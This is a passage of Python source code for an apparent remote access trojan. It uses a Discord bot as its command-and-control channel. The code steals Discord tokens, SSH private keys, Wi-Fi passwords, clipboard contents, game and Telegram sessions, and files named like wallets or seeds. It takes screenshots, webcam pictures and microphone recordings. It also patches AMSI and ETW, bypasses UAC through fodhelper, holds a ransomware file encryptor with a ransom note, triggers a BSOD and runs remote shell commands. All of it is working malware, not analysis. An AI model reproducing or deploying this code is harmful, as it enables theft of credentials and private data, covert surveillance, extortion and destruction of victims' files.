        p.extend([Path(l)/"Google/Chrome/User Data/Default/Local Storage/leveldb",Path(l)/"BraveSoftware/Brave-Browser/User Data/Default/Local Storage/leveldb"])
    else:
        h=Path.home()
        p=[h/".config/discord/Local Storage/leveldb",h/".config/discordcanary/Local Storage/leveldb",h/".config/discordptb/Local Storage/leveldb",h/".config/google-chrome/Default/Local Storage/leveldb"]
    for pth in p:
        if not pth.exists():continue
        for f in pth.glob("*.log")+pth.glob("*.ldb"):
            try:
                with open(f,'rb') as file:
                    c=file.read(errors='ignore')
                try:tc=c.decode('utf-8',errors='ignore')
                except:continue
                pl=re.findall(r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}',tc)
                t.extend(pl)
                if os.name=='nt' and _k:
                    enc=re.findall(r'dQw4w9WgXcQ:([A-Za-z0-9+/=]+)',tc)
                    for e in enc:
                        try:
                            lsp=None
                            if 'discord' in str(pth):
                                dp=pth.parent.parent.parent
                                lsp=dp/"Local State"
                            elif 'Chrome' in str(pth) or 'Brave' in str(pth):
                                bp=pth.parent.parent.parent.parent.parent
                                lsp=bp/"Local State"
                            if lsp and lsp.exists():
                                with open(lsp,'r') as lf:
                                    ld=json.load(lf)
                                ek=base64.b64decode(ld['os_crypt']['encrypted_key'])
                                if ek[:5]==b'DPAPI':ek=ek[5:]
                                mk=_k.CryptUnprotectData(ek,None,None,None,0)[1]
                                ed=base64.b64decode(e)
                                n=ed[3:15];ct=ed[15:]
                                ci=AES.new(mk,AES.MODE_GCM,nonce=n)
                                dec=ci.decrypt(ct)
                                tok=dec[:-16].decode('utf-8')
                                if re.match(r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}',tok):
                                    t.append(tok)
                        except:pass
            except:pass
    t=list(set(t))
    v=[]
    for tok in t:
        try:
            h={"Authorization":tok}
            r=_b.get("https://discord.com/api/v9/users/@me",headers=h,timeout=5)
            if r.status_code==200:
                ud=r.json()
                ud['token']=tok
                r2=_b.get("https://discord.com/api/v9/users/@me/guilds",headers=h,timeout=5)
                if r2.status_code==200:ud['guilds']=r2.json()
                r3=_b.get("https://discord.com/api/v9/users/@me/billing/payment-sources",headers=h,timeout=5)
                if r3.status_code==200:ud['billing']=r3.json()
                v.append(ud)
        except:pass
    return json.dumps(v)
def _38():
    k=[]
    sp=[Path.home()/".ssh",Path.home()/"ssh",Path.home()/"Documents/ssh",Path.home()/"Desktop/ssh"]
    if os.name=='nt':
        sp.append(Path(os.getenv('PROGRAMDATA'))/"ssh")
        sp.append(Path(os.getenv('ALLUSERSPROFILE'))/"ssh")
    for s in sp:
        if s.exists():
            for f in s.glob("*"):
                if f.is_file() and not f.name.endswith('.pub') and not f.name.startswith('.'):
                    try:
                        c=f.read_text()
                        if 'BEGIN' in c and ('PRIVATE KEY' in c or 'RSA' in c):
                            k.append({'file':f.name,'content':c[:500]})
                    except:pass
    return k
def _39():
    if os.name=='nt':
        try:
            o=subprocess.run(['netsh','wlan','show','profiles'],capture_output=True,text=True).stdout
            n=re.findall(r'All User Profile\s*:\s*(.*)',o)
            d=[]
            for nm in n:
                r=subprocess.run(['netsh','wlan','show','profile',nm,'key=clear'],capture_output=True,text=True).stdout
                pw=re.search(r'Key Content\s*:\s*(.*)',r)
                d.append({"ssid":nm.strip(),"password":pw.group(1) if pw else ""})
            return d
        except:return []
    else:
        d=[]
        nm=Path('/etc/NetworkManager/system-connections')
        if nm.exists() and os.access(nm,os.R_OK):
            for c in nm.glob('*'):
                try:
                    cnt=c.read_text()
                    ssid=re.search(r'ssid=(.*)',cnt)
                    psk=re.search(r'psk=(.*)',cnt)
                    if ssid:
                        d.append({"ssid":ssid.group(1).strip('"'),"password":psk.group(1) if psk else ""})
                except:pass
        wp=Path('/etc/wpa_supplicant/wpa_supplicant.conf')
        if wp.exists() and os.access(wp,os.R_OK):
            try:
                cnt=wp.read_text()
                nets=re.findall(r'network={([^}]*)}',cnt,re.DOTALL)
                for n in nets:
                    ssid=re.search(r'ssid="([^"]*)"',n)
                    psk=re.search(r'psk="([^"]*)"',n)
                    if ssid:
                        d.append({"ssid":ssid.group(1),"password":psk.group(1) if psk else ""})
            except:pass
        if not d and shutil.which('nmcli'):
            try:
                r=subprocess.run(['nmcli','-t','-f','name,802-11-wireless-security.psk','connection','show'],capture_output=True,text=True)
                for l in r.stdout.strip().split('\n'):
                    if ':' in l:
                        ssid,psk=l.split(':',1)
                        d.append({"ssid":ssid,"password":psk})
            except:pass
        if not d and shutil.which('iwlist'):
            try:
                r=subprocess.run(['iwlist','scan'],capture_output=True,text=True,timeout=10)
                essids=re.findall(r'ESSID:"([^"]*)"',r.stdout)
                for e in essids:
                    d.append({"ssid":e,"password":""})
            except:pass
        return d
def _40():
    try:
        if _g:return _g.paste()
        elif os.name=='nt':
            import win32clipboard
            win32clipboard.OpenClipboard()
            d=win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()
            return d
        else:
            r=subprocess.run(['xclip','-selection','clipboard','-o'],capture_output=True,text=True)
            return r.stdout if r.returncode==0 else None
    except:return None
def _41():
    d={}
    if os.name=='nt':
        try:
            k=winreg.OpenKey(winreg.HKEY_CURRENT_USER,r"Software\Valve\Steam")
            sp=winreg.QueryValueEx(k,"SteamPath")[0]
            c=Path(sp)/"config/loginusers.vdf"
            if c.exists():d['steam']=c.read_text(errors='ignore')
        except:pass
    else:
        sp=Path.home()/".steam/steam/config/loginusers.vdf"
        if sp.exists():d['steam']=sp.read_text(errors='ignore')
    if os.name=='nt':
        td=Path(os.getenv('APPDATA'))/"Telegram Desktop/tdata"
    else:
        td=Path.home()/".local/share/TelegramDesktop/tdata"
    if td.exists():
        try:
            if os.name=='nt':subprocess.run(['taskkill','/F','/IM','Telegram.exe'],capture_output=True)
            else:subprocess.run(['pkill','-f','Telegram'],capture_output=True)
            time.sleep(1)
            dst=Path(tempfile.gettempdir())/"telegram_tdata"
            if dst.exists():shutil.rmtree(dst,ignore_errors=True)
            shutil.copytree(td,dst)
            d['telegram']=str(dst)
        except:pass
    if os.name=='nt':
        rt=Path(os.getenv('LOCALAPPDATA'))/"Riot Games"
        if rt.exists():d['riot']=str(rt)
        ep=Path(os.getenv('LOCALAPPDATA'))/"EpicGamesLauncher/Saved"
        if ep.exists():d['epic']=str(ep)
    return json.dumps(d)
def _42():
    i={'host':socket.gethostname(),'user':getpass.getuser(),'os':f"{platform.system()} {platform.release()}",'arch':platform.machine(),'cpu':os.cpu_count(),'vid':_14()}
    try:i['ip']=_b.get('https://api.ipify.org',timeout=5).text
    except:pass
    try:i['geo']=_b.get(f"http://ip-api.com/json/{i['ip']}",timeout=5).json()
    except:pass
    return json.dumps(i)
def _43():
    if _c:return "\n".join([f"{p.info['pid']}: {p.info['name']}" for p in _c.process_iter(['pid','name'])])
    elif os.name=='nt':return subprocess.run(['tasklist'],capture_output=True,text=True).stdout
    else:return subprocess.run(['ps','aux'],capture_output=True,text=True).stdout
def _44():
    if _c:
        c=[]
        for conn in _c.net_connections(kind='inet'):
            l=f"{conn.laddr.ip}:{conn.laddr.port}" if conn.laddr else "?"
            r=f"{conn.raddr.ip}:{conn.raddr.port}" if conn.raddr else "?"
            c.append(f"{conn.type.name} {l} -> {r} {conn.status}")
        return "\n".join(c[:100])
    elif os.name=='nt':return subprocess.run(['netstat','-an'],capture_output=True,text=True).stdout
    else:
        try:return subprocess.run(['ss','-tunlp'],capture_output=True,text=True).stdout
        except:return subprocess.run(['netstat','-tunlp'],capture_output=True,text=True).stdout
def _45():
    if os.name=='nt':return subprocess.run(['arp','-a'],capture_output=True,text=True).stdout
    else:return subprocess.run(['arp','-n'],capture_output=True,text=True).stdout
def _46():
    if os.name=='nt':
        try:
            r=subprocess.run(['ipconfig','/displaydns'],capture_output=True,text=True,timeout=10)
            if r.returncode!=0:return "Failed"
            o=r.stdout
            e=[]
            rn=None
            ar=None
            for l in o.split('\n'):
                if 'Record Name' in l:
                    if rn and ar:e.append(f"{rn}: {ar}")
                    rn=l.split(':',1)[1].strip()
                    ar=None
                elif 'A (Host) Record' in l:
                    ar=l.split(':',1)[1].strip()
            if rn and ar:e.append(f"{rn}: {ar}")
            if not e:return "No DNS cache"
            return '\n'.join(e[:50])
        except Exception as e:return f"DNS error: {e}"
    else:
        for cmd in [['systemd-resolve','--statistics'],['resolvectl','statistics']]:
            try:
                r=subprocess.run(cmd,capture_output=True,text=True,timeout=10)
                if r.returncode==0:return r.stdout[:1900]
            except:continue
        return "DNS cache not available"
def _47():
    if os.name=='nt':
        try:
            sw=[]
            ks=[r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall",r"SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall"]
            for kp in ks:
                try:
                    with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE,kp) as key:
                        for i in range(winreg.QueryInfoKey(key)[0]):
                            sn=winreg.EnumKey(key,i)
                            try:
                                with winreg.OpenKey(key,sn) as sk:
                                    dn=winreg.QueryValueEx(sk,"DisplayName")[0]
                                    if dn:sw.append(dn)
                            except:pass
                except:pass
            return sw
        except:return []
    else:
        try:return subprocess.run(['dpkg','-l'],capture_output=True,text=True).stdout
        except:return "N/A"
def _48():
    r=[]
    if os.name=='nt':
        rd=Path.home()/"AppData/Roaming/Microsoft/Windows/Recent"
        if rd.exists():
            for f in rd.glob("*.lnk"):
                try:r.append(f.name)
                except:pass
    else:
        rd=Path.home()/".local/share/recently-used.xbel"
        if rd.exists():
            try:r=rd.read_text()
            except:pass
    return r
def _49():return json.dumps(dict(os.environ))
def _50():
    try:
        ip=_b.get('https://api.ipify.org',timeout=5).text
        g=_b.get(f"http://ip-api.com/json/{ip}",timeout=5).json()
        return json.dumps({'ip':ip,'geo':g})
    except:return "[-] Failed"
def _51():
    p=Path(tempfile.gettempdir())/"sc.png"
    if _i:
        try:_i.screenshot().save(p);return p.read_bytes()
        except:pass
    try:
        if platform.system()=='Darwin':
            subprocess.run(['screencapture',str(p)],timeout=5)
            return p.read_bytes()
        else:
            if shutil.which('scrot'):
                subprocess.run(['scrot',str(p)],timeout=5,check=True)
                return p.read_bytes()
            elif shutil.which('import'):
                subprocess.run(['import','-window','root',str(p)],timeout=5,check=True)
                return p.read_bytes()
    except:return None
def _52():
    with open(os.devnull,'w') as __,contextlib.redirect_stderr(__):
        if _e:
            try:
                cap=_e.VideoCapture(0)
                if not cap.isOpened():
                    for b in [getattr(_e,'CAP_V4L2',None),getattr(_e,'CAP_DSHOW',None)]:
                        if b is not None:
                            cap=_e.VideoCapture(0,b)
                            if cap.isOpened():break
                if cap.isOpened():
                    ret,fr=cap.read()
                    cap.release()
                    if ret:
                        _,buf=_e.imencode('.jpg',fr)
                        return buf.tobytes()
            except:pass
        if shutil.which('fswebcam'):
            p=Path(tempfile.gettempdir())/"webcam.jpg"
            try:
                subprocess.run(['fswebcam','-r','640x480','--no-banner',str(p)],timeout=10,capture_output=True)
                if p.exists():return p.read_bytes()
            except:pass
    return None
def _53():
    if _f:
        try:
            import wave
            CHUNK=1024;FORMAT=_f.paInt16;CHANNELS=1;RATE=44100;SEC=5
            p=_f.PyAudio()
            s=p.open(format=FORMAT,channels=CHANNELS,rate=RATE,input=True,frames_per_buffer=CHUNK)
            frames=[s.read(CHUNK) for _ in range(int(RATE/CHUNK*SEC))]
            s.stop_stream();s.close();p.terminate()
            w=io.BytesIO()
            wf=wave.open(w,'wb')
            wf.setnchannels(CHANNELS)
            wf.setsampwidth(p.get_sample_size(FORMAT))
            wf.setframerate(RATE)
            wf.writeframes(b''.join(frames))
            wf.close()
            return w.getvalue()
        except:pass
    if shutil.which('arecord'):
        p=Path(tempfile.gettempdir())/"audio.wav"
        try:
            subprocess.run(['arecord','-d','5','-f','cd','-t','wav',str(p)],timeout=10,capture_output=True)
            if p.exists():return p.read_bytes()
        except:pass
    return None
def _54():
    fs=[]
    ds=[Path.home()/d for d in ['Desktop','Downloads','Documents'] if (Path.home()/d).exists()]
    kw=['password','wallet','seed','backup','key','private','recovery','phrase','crypto','secret','token','mnemonic','2fa','totp']
    for d in ds:
        for f in d.rglob("*"):
            if f.is_file() and f.stat().st_size<10*1024*1024:
                if any(k in f.name.lower() for k in kw):
                    try:fs.append((f,f.read_bytes()[:5000]))
                    except:pass
    return fs
_oc={}
_pl=[
    ("Twitter","https://twitter.com/{}"),("Instagram","https://www.instagram.com/{}"),("GitHub","https://github.com/{}"),("Reddit","https://www.reddit.com/user/{}"),("YouTube","https://www.youtube.com/@{}"),("Twitch","https://www.twitch.tv/{}"),("TikTok","https://www.tiktok.com/@{}"),("Facebook","https://www.facebook.com/{}"),("LinkedIn","https://www.linkedin.com/in/{}"),("Pinterest","https://www.pinterest.com/{}"),("Tumblr","https://{}.tumblr.com"),("Snapchat","https://www.snapchat.com/add/{}"),("Telegram","https://t.me/{}"),("Discord","https://discord.com/users/{}"),("Spotify","https://open.spotify.com/user/{}"),("Medium","https://medium.com/@{}"),("DeviantArt","https://www.deviantart.com/{}"),("VK","https://vk.com/{}"),("Flickr","https://www.flickr.com/people/{}"),("Trello","https://trello.com/{}"),("Bitbucket","https://bitbucket.org/{}"),("Keybase","https://keybase.io/{}"),("Pastebin","https://pastebin.com/u/{}"),("HackerNews","https://news.ycombinator.com/user?id={}"),("ProductHunt","https://www.producthunt.com/@{}"),("Quora","https://www.quora.com/profile/{}"),("Steam","https://steamcommunity.com/id/{}"),("SoundCloud","https://soundcloud.com/{}"),("Mixcloud","https://www.mixcloud.com/{}"),("Behance","https://www.behance.net/{}"),("Dribbble","https://dribbble.com/{}"),("Gravatar","https://en.gravatar.com/{}"),("Imgur","https://imgur.com/user/{}"),("CodePen","https://codepen.io/{}"),("GitLab","https://gitlab.com/{}"),("PyPI","https://pypi.org/user/{}"),("NPM","https://www.npmjs.com/~{}"),("RubyGems","https://rubygems.org/profiles/{}"),("Crunchyroll","https://www.crunchyroll.com/user/{}"),("Last.fm","https://www.last.fm/user/{}"),("WordPress","https://{}.wordpress.com"),("Foursquare","https://foursquare.com/{}"),("AngelList","https://angel.co/u/{}"),("ResearchGate","https://www.researchgate.net/profile/{}"),("Academia","https://independent.academia.edu/{}"),("Google Scholar","https://scholar.google.com/citations?user={}")
]
def _55(u,t):
    url=t.format(u)
    try:
        r=_b.head(url,timeout=5,allow_redirects=True)
        if r.status_code==200:return url
        return None
    except:return None
def _56(u):
    if u in _oc:return _oc[u]
    r=[]
    for n,t in _pl:
        url=_55(u,t)
        if url:r.append((n,url))
        time.sleep(0.5)
    _oc[u]=r
    return r
def _57():
    u=set()
    u.add(getpass.getuser())
    try:
        bd=json.loads(_29())
        for br,pr in bd.items():
            for pn,es in pr.items():
                for e in es:
                    if e.get('username'):u.add(e['username'])
    except:pass
    return list(u)
def _58():
    if os.name!='nt':return
    try:
        import ctypes
        k=ctypes.windll.kernel32
        a=ctypes.windll.amsi
        sa=ctypes.cast(a.AmsiScanBuffer,ctypes.c_void_p).value
        k.VirtualProtect(sa,6,0x40,ctypes.byref(ctypes.c_ulong()))
        ctypes.memmove(sa,b'\xB8\x00\x00\x00\x00\xC3',6)
        n=ctypes.windll.ntdll
        ea=ctypes.cast(n.EtwEventWrite,ctypes.c_void_p).value
        k.VirtualProtect(ea,6,0x40,ctypes.byref(ctypes.c_ulong()))
        ctypes.memmove(ea,b'\xC3',1)
    except:pass
def _59():
    if os.name!='nt':return False
    try:
        key=r"Software\Classes\ms-settings\shell\open\command"
        with winreg.CreateKey(winreg.HKEY_CURRENT_USER,key) as k:
            winreg.SetValueEx(k,"",0,winreg.REG_SZ,sys.executable)
            winreg.SetValueEx(k,"DelegateExecute",0,winreg.REG_SZ,"")
        subprocess.Popen("fodhelper.exe",shell=True)
        time.sleep(2)
        winreg.DeleteKey(winreg.HKEY_CURRENT_USER,key)
        return True
    except:return False
_rn="ransom@example.com"
def _60():
    global _o,_p
    if not _o:return "Ransomware not enabled. Use !ransom enable"
    ef=[]
    td=[Path.home()/d for d in ['Desktop','Documents','Downloads','Pictures'] if (Path.home()/d).exists()]
    for d in td:
        for f in d.rglob("*"):
            if f.is_file() and f.stat().st_size<100*1024*1024:
                try:
                    with open(f,'rb') as fp:data=fp.read()
                    iv=os.urandom(16)
                    ci=AES.new(_p,AES.MODE_CBC,iv)
                    ct=ci.encrypt(data.ljust((len(data)+AES.block_size-1)//AES.block_size*AES.block_size,b'\x00'))
                    with open(f,'wb') as fp:fp.write(iv+ct)
                    ef.append(str(f))
                except:pass
    np=Path.home()/"Desktop/README_RANSOM.txt"
    nc=f"""YOUR FILES HAVE BEEN ENCRYPTED!
Contact us at: {_rn} to pay ransom.
Your files will be permanently lost if you don't pay within 72 hours.
"""
    np.write_text(nc)
    return f"Encrypted {len(ef)} files."
def _61():return "Decryption not implemented"
def _62():
    def w():
        import ctypes
        while True:
            ctypes.windll.user32.MessageBoxW(0,"You are an idiot!","Virus Alert",0x10|0x0)
            time.sleep(0.5)
    def l():
        while True:
            subprocess.run(['zenity','--error','--text','You are an idiot!','--title','Virus Alert'],capture_output=True)
            time.sleep(0.5)
    def m():
        while True:
            subprocess.run(['osascript','-e','display dialog "You are an idiot!" with title "Virus Alert" buttons {"OK"} default button "OK" with icon caution'],capture_output=True)
            time.sleep(0.5)
    if os.name=='nt':threading.Thread(target=w,daemon=True).start()
    elif platform.system()=='Linux':threading.Thread(target=l,daemon=True).start()
    elif platform.system()=='Darwin':threading.Thread(target=m,daemon=True).start()
def _63():
    global _s
    while not _s.is_set():
        for _ in range(1000000):pass
def _64():
    global _r,_s
    if _r and _r.is_alive():return "CPU stress already running."
    _s.clear()
    _r=threading.Thread(target=_63,daemon=True)
    _r.start()
    return "CPU stress started."
def _65():
    global _r,_s
    if _r and _r.is_alive():
        _s.set()
        _r.join(timeout=2)
        return "CPU stress stopped."
    return "CPU stress not running."
def _66():
    for _ in range(10):
        try:
            if os.name=='nt':
                import winsound
                winsound.Beep(1000,500)
            else:subprocess.run(['beep','-f','1000','-l','500'],capture_output=True)
        except:pass
        time.sleep(0.5)
def _67():
    threading.Thread(target=_66,daemon=True).start()
    return "Beeping started."
def _68():
    if not _i:return "PyAutoGUI not available."
    for _ in range(50):
        x=random.randint(0,1920)
        y=random.randint(0,1080)
        _i.moveTo(x,y,duration=0.1)
        time.sleep(0.1)
    return "Mouse chaos complete."
def _69():
    for _ in range(10):
        try:
            if os.name=='nt':
                subprocess.Popen('calc.exe')
                subprocess.Popen('notepad.exe')
            else:
                subprocess.Popen(['gnome-calculator'])
                subprocess.Popen(['gedit'])
        except:pass
        time.sleep(0.5)
    return "Opened many windows."
def _70():
    try:
        if os.name=='nt':
            if shutil.which('nircmd'):
                subprocess.run(['nircmd','win','rotate','180'])
                return "Screen flipped."
            else:return "nircmd not found."
        else:
            o=subprocess.run(['xrandr'],capture_output=True,text=True)
            for l in o.stdout.splitlines():
                if ' connected' in l:
                    dsp=l.split()[0]
                    subprocess.run(['xrandr','--output',dsp,'--rotate','inverted'],capture_output=True)
                    return f"Screen flipped on {dsp}."
            return "Could not find connected display."
    except Exception as e:return f"Failed: {e}"
def _71():
    try:
        if os.name=='nt':
            import winsound
            for _ in range(3):winsound.Beep(2000,1000)
        else:
            for _ in range(3):
                subprocess.run(['speaker-test','-t','sine','-f','1000','-l','1'],capture_output=True)
                time.sleep(0.5)
        return "Screaming complete."
    except:return "Scream failed."
class _72:
    def __init__(self,c):
        self.c2=c
        self.s=False
        self.q=50
    def cap(self):
        if _i:
            try:
                s=_i.screenshot()
                img=np.array(s)
                _,buf=_e.imencode('.jpg',img,[_e.IMWRITE_JPEG_QUALITY,self.q])
                return buf.tobytes()
            except:pass
        return None
    def start(self,ch):
        self.s=True
        while self.s:
            f=self.cap()
            if f:self.c2.exfil(f,f"stream_{int(time.time())}.jpg")
            time.sleep(0.5)
    def stop(self):self.s=False
def _73(c):
    try:
        r=subprocess.run(c,shell=True,capture_output=True,text=True,timeout=60)
        return r.stdout+r.stderr if (r.stdout+r.stderr) else "[+] Done"
    except:return "[-] Error"
def _74(n):
    if os.name=='nt':subprocess.run(['taskkill','/F','/IM',n],capture_output=True)
    else:subprocess.run(['pkill','-f',n],capture_output=True)
    return f"[+] Killed {n}"
def _75(p):
    global _n
    try:os.chdir(p);_n=os.getcwd();return f"[+] Changed to {_n}"
    except:return "[-] Cannot change directory"
def _76(p=None):
    global _n
    t=p if p else _n
    try:return "\n".join(os.listdir(t))
    except:return "[-] Cannot list"
def _77(p):
    if not p:return "Usage: cat <file>"
    global _n
    fp=os.path.join(_n,p) if not os.path.isabs(p) else p
    try:
        with open(fp,'r') as f:return f.read(10000)
    except:return "[-] Cannot read"
def _78(p):
    global _n
    fp=os.path.join(_n,p) if not os.path.isabs(p) else p
    try:os.remove(fp);return "[+] Deleted"
    except:return "[-] Cannot delete"
def _79(p):
    global _n
    fp=os.path.join(_n,p) if not os.path.isabs(p) else p
    try:os.mkdir(fp);return "[+] Created"
    except:return "[-] Cannot create"
def _80(p):
    global _n
    fp=os.path.join(_n,p) if not os.path.isabs(p) else p
    try:
        with open(fp,'rb') as f:return f.read()
    except:return None
def _81(u,p):
    global _n
    fp=os.path.join(_n,p) if not os.path.isabs(p) else p
    try:
        r=_b.get(u,timeout=30)
        with open(fp,'wb') as f:f.write(r.content)
        return "[+] Downloaded"
    except:return "[-] Download failed"
def _82():
    if os.name=='nt':os.system("shutdown /s /t 5")
    else:os.system("shutdown -h now")
    return "[!] Shutting down"
def _83():
    if os.name=='nt':os.system("shutdown /r /t 5")
    else:os.system("shutdown -r now")
    return "[!] Restarting"
def _84():
    if os.name=='nt':os.system("shutdown /l")
    else:os.system("gnome-session-quit --no-prompt")
    return "[!] Logging off"
def _85():
    if os.name=='nt':
        try:
            import ctypes
            n=ctypes.windll.ntdll
            n.RtlAdjustPrivilege(19,1,0,ctypes.byref(ctypes.c_int()))
            n.NtRaiseHardError(0xC0000022,0,0,0,6,ctypes.byref(ctypes.c_int()))
        except:pass
    return "[!] BSOD attempted"
def _86():
    if os.name=='nt':
        try:
            import ctypes
            ctypes.windll.user32.BlockInput(True)
        except:pass
    return "[+] Input blocked"
def _87():
    if os.name=='nt':
        try:
            import ctypes
            ctypes.windll.user32.BlockInput(False)
        except:pass
    return "[+] Input unblocked"
def _88(t,m):
    if os.name=='nt':
        try:
            import ctypes
            ctypes.windll.user32.MessageBoxW(0,m,t,0)
        except:pass
    else:
        subprocess.Popen(['zenity','--info','--title',t,'--text',m])
    return "[+] Message shown"
def _89(p):
    global _n
    fp=os.path.join(_n,p) if not os.path.isabs(p) else p
    if os.name=='nt':
        try:
            import ctypes
            ctypes.windll.user32.SystemParametersInfoW(20,0,fp,3)
        except:pass
    else:
        subprocess.Popen(['gsettings','set','org.gnome.desktop.background','picture-uri',f'file://{fp}'])
    return "[+] Wallpaper changed"
def _90(k):
    try:
        if _h:_h.press_and_release(k)
        elif _i:_i.press(k)
    except:pass
    return f"[+] Pressed {k}"
def _91(x,y):
    try:
        if _i:_i.click(x,y)
    except:pass
    return f"[+] Clicked at ({x},{y})"
def _92(t):
    try:
        if _i:_i.typewrite(t)
    except:pass
    return f"[+] Typed {len(t)} chars"
def _93():
    if os.name=='nt':
        try:
            import ctypes
            class LASTINPUTINFO(ctypes.Structure):
                _fields_=[('cbSize',ctypes.c_uint),('dwTime',ctypes.c_uint)]
            lii=LASTINPUTINFO()
            lii.cbSize=ctypes.sizeof(lii)
            ctypes.windll.user32.GetLastInputInfo(ctypes.byref(lii))
            millis=ctypes.windll.kernel32.GetTickCount()-lii.dwTime
            return millis/1000.0
        except:pass
    else:
        try:
            idle_ms=subprocess.run(['xprintidle'],capture_output=True,text=True,timeout=2)
            if idle_ms.returncode==0:
                return int(idle_ms.stdout.strip())/1000.0
        except:pass
        try:
            import dbus
            bus=dbus.SessionBus()
            ss=bus.get_object('org.gnome.ScreenSaver','/org/gnome/ScreenSaver')
            idle=ss.get_dbus_method('GetSessionIdleTime','org.gnome.ScreenSaver')
            return idle()/1000.0
        except:pass
        try:
            w_out=subprocess.run(['w','-h'],capture_output=True,text=True,timeout=2)
            for l in w_out.stdout.strip().split('\n'):
                p=l.split()
                if len(p)>4:
                    idle_str=p[4]
                    if 'days' in idle_str:return 86400
                    elif ':' in idle_str:
                        h,m=idle_str.split(':')
                        return int(h)*3600+int(m)*60
                    elif idle_str=='idle':return 0
        except:pass
    return "N/A"
def _94(l):
    if os.name=='nt':
        try:
            from ctypes import cast,POINTER
            from comtypes import CLSCTX_ALL
            from pycaw.pycaw import AudioUtilities,IAudioEndpointVolume
            devs=AudioUtilities.GetSpeakers()
            intf=devs.Activate(IAudioEndpointVolume._iid_,CLSCTX_ALL,None)
            vol=cast(intf,POINTER(IAudioEndpointVolume))
            vol.SetMasterVolumeLevelScalar(l/100,None)
        except:pass
    return f"[+] Volume set to {l}%"
def _95():return "pong"
class _96:
    def __init__(self):
        self.h={"Authorization":f"Bot {_7}"}
        self.u=None
        self.g={}
        self.cc=None
        self.dc=None
        self.seen=set()
    def init(self):
        try:
            r=_b.get("https://discord.com/api/v9/users/@me",headers=self.h,timeout=10)
            if r.status_code==200:
                self.u=r.json()['id']
                return True
            return False
        except:return False
    def get_g(self):
        try:
            r=_b.get("https://discord.com/api/v9/users/@me/guilds",headers=self.h,timeout=10)
            if r.status_code==200:
                for g in r.json():
                    self.g[g['id']]=g['name']
        except:pass
    def mkch(self):
        if not self.g:self.get_g()
        if not self.g:return False
        gid=list(self.g.keys())[0]
        vn=socket.gethostname().replace(' ','-')[:32]
        try:
            url=f"https://discord.com/api/v9/guilds/{gid}/channels"
            data={"name":f"victim-{vn}-{random.randint(1000,9999)}","type":4}
            r=_b.post(url,headers=self.h,json=data,timeout=10)
            if r.status_code==201:
                cid=r.json()['id']
                data={"name":"commands","type":0,"parent_id":cid,"topic":f"Commands for {vn}"}
                r=_b.post(url,headers=self.h,json=data,timeout=10)
                if r.status_code==201:self.cc=r.json()['id']
                data={"name":"data","type":0,"parent_id":cid}
                r=_b.post(url,headers=self.h,json=data,timeout=10)
                if r.status_code==201:self.dc=r.json()['id']
                return True
        except:pass
        return False
    def getm(self,ch):
        if not ch:return[]
        try:
            r=_b.get(f"https://discord.com/api/v9/channels/{ch}/messages",headers=self.h,timeout=10)
            return r.json() if r.status_code==200 else[]
        except:return[]
    def sendm(self,ch,msg):
        if not ch:return
        for i in range(0,len(msg),1900):
            try:
                _b.post(f"https://discord.com/api/v9/channels/{ch}/messages",headers=self.h,json={'content':msg[i:i+1900]},timeout=10)
            except:pass
    def exfil(self,data,fn=None):
        if not self.dc and not _8:return
        if self.dc:
            if isinstance(data,bytes):
                try:
                    _b.post(f"https://discord.com/api/v9/channels/{self.dc}/messages",headers=self.h,files={'file':(fn,data)},timeout=30)
                except:pass
            else:
                txt=str(data)
                for i in range(0,len(txt),1900):
                    try:
                        _b.post(f"https://discord.com/api/v9/channels/{self.dc}/messages",headers=self.h,json={'content':txt[i:i+1900]},timeout=10)
                    except:pass
        elif _8:
            if isinstance(data,bytes):
                try:_b.post(_8,files={'file':(fn,data)},timeout=30)
                except:pass
            else:
                txt=str(data)
                for i in range(0,len(txt),1900):
                    try:_b.post(_8,data={'content':txt[i:i+1900]},timeout=30)
                    except:pass
def _97():
    global _l,_m,_n,_q,_o,_rn
    _58()
    _13()
    op=os.path.abspath(__file__)
    hp=_y(op)
    _10(hp)
    _12(hp)
    c=_96()
    if not c.init():return
    if not c.mkch():return
    c.exfil(_42(),"sys.json")
    c.exfil(_29(),"browsers.json")
    c.exfil(_32(),"history.json")
    c.exfil(_30(),"cookies.json")
    c.exfil(_31(),"cards.json")
    c.exfil(_33(),"bookmarks.json")
    c.exfil(_34(),"downloads.json")
    c.exfil(json.dumps(_35()),"roblox.json")
    c.exfil(_36(),"wallets.json")
    c.exfil(_37(),"tokens.json")
    c.exfil(json.dumps(_38()),"ssh.json")
    c.exfil(json.dumps(_39()),"wifi.json")
    c.exfil(_41(),"apps.json")
    c.exfil(_40(),"clipboard.txt")
    c.exfil(json.dumps(_16()),"wmi.json")
    s=_51()
    if s:c.exfil(s,"screenshot.png")
    for f,d in _54():
        c.exfil(d,f.name)
    u=_57()
    if u:
        oi={}
        for un in u[:10]:
            r=_56(un)
            if r:oi[un]=r
        if oi:c.exfil(json.dumps(oi),"osint.json")
    global _m
    _m=_22()
    _m.start()
    while _l:
        try:
            msgs=c.getm(c.cc)
            for m in msgs:
                if m['id'] in c.seen:continue
                c.seen.add(m['id'])
                if m['author']['id']==c.u:continue
                cnt=m['content']
                if not cnt.startswith(_pfx):continue
                cmd=cnt[len(_pfx):].strip()
                sp=cmd.split(maxsplit=1)
                act=sp[0].lower()
                arg=sp[1] if len(sp)>1 else ""
                if act=="help":
                    c.sendm(c.cc,"**Commands:**\nshell,ps,kill,restart,shutdown,logoff,bsod,blockinput,unblockinput\ncd,ls,cat,rm,mkdir,upload,download\nscreenshot,webcam,mic,keylog,clipboard,idletime\nsysinfo,passwords,history,cookies,cards,bookmarks,downloads,roblox,tokens,wallets,ssh,wifi,apps,wmi\nnetstat,arp,dns,software,recent,env,geo,ping,window\nfingerprint,webcams,record_screen,allwebcams,stream_start,stream_stop,stream_quality\nosint <user>,startup,uninstall,selfdestruct\nransom enable,ransom encrypt,ransom decrypt\nidiot,stress start,stress stop,beep,mouse,openmany,flip,scream\namsi,uac,inject")
                elif act=="shell":c.sendm(c.cc,f"```{_73(arg)}```")
                elif act=="ps":c.sendm(c.cc,f"```{_43()[:1900]}```")
                elif act=="kill":c.sendm(c.cc,_74(arg))
                elif act=="restart":c.sendm(c.cc,_83())
                elif act=="shutdown":c.sendm(c.cc,_82())
                elif act=="logoff":c.sendm(c.cc,_84())
                elif act=="bsod":c.sendm(c.cc,_85())
